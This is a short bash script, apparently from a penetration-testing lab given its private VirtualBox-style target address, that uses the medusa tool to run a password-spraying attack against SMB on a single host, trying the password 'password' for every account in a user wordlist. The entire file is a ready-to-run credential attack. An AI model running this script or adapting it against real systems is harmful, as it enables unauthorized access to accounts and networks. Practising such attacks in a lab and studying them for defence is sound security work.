#!/bin/bash

TARGET="192.168.56.102"
USERS="../wordlists/users.txt"

echo "[+] Executando password spraying SMB..."
medusa -h $TARGET -U $USERS -p password -M smbnt

